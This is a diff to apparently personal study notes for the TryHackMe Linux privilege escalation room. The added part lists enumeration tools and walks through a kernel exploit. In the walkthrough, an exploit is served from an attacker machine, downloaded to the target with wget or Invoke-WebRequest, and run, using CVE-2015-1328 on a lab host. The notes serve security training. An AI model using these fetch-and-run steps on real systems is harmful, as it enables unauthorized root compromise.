@@ -4,6 +4,7 @@ https://tryhackme.com/room/linprivesc
 - [[#y tho]]
 - [[#Enumeration]] --> [[#`ps` -- Processes|`ps`]], [[#`find`|`find`]]
 - [[#Automated Enumeration]]
+- [[#Kernel Exploits]]
 - 
 
 
@@ -107,16 +108,45 @@ ___
 ### Automated Enumeration
 [[#Table of contents|Back to the top]]
 
+*Only used to save time: manual is better* 
 
+Tool used depends on target system: unable to run Python tool if Python isn't installed on target
+
+- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
+- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
+- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
 
 ___
-### 
+### Kernel Exploits
 [[#Table of contents|Back to the top]]
 
+*Kernel manages communication between components (memory, applications, ...)*
 
+1. Identify **kernel version** -- `uname -a` / `/proc/version`
+2. Search for **exploit**
+3. **Transfer** exploit to target
+	1. Set up python web server: **`python -m http.server 8000`**
+	2. Download on target machine:
+	   **`wget <attacker_IP>:8000/exploit -O /tmp/exploit`**
+	   **`Invoke-WebRequest -uri <attacker-IP>:8000/exploit -outfile C:\\Windows\temp\exploit`**
+	3. `chmod +x exploit`: make it executable
+4. **Run** exploit: `./exploit`
+
+**NB:** failed kernel exploit can lead to system crash
+
+##### Practical
+1. Kernel version: 3.13.0
+2. Exploit-DB --> CVE-2015-1328
+3. Compile: `gcc 37292.c -o exploit`
+4. Set up web server: `python3 -m http.server 8000`
+5. Download: `wget 10.81.70.121:8000/exploit -O /tmp/exploit`
+6. Make it executable: `chmod +x exploit`
+7. Run: `./exploit`
 
 ___
-### 
+### Sudo
 [[#Table of contents|Back to the top]]
 
 
